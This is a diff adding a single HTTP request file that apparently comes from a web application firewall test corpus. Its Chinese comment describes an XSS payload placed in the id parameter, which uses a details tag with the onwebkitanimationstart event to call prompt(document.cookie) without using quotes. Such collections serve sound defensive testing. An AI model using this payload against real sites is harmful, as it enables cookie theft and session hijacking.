@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_details标签_onwebkitanimationstart事件-06506605
+# 攻击载荷利用了HTML中的details标签和onwebkitanimationstart属性，触发prompt()函数，显示一个提示框。当 CSS 动画开始时触发，未使用单引号和双引号绕过测试，读取coolkie
+GET /?id=%3Cstyle%3E@keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cdetails%20style=%22animation-name:x%22%20onwebkitanimationstart=prompt%28document.cookie%29%3E%3C%2Fdetails%3E&bid=hd_tag_m8mv25v0 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25v0
+RM-PRO-Token: 5513eb95726ee7d2cd45feb02ee323b7
+RM-PRO-Time: 1742808508959
+User-Agent: curl/7.83.1
+
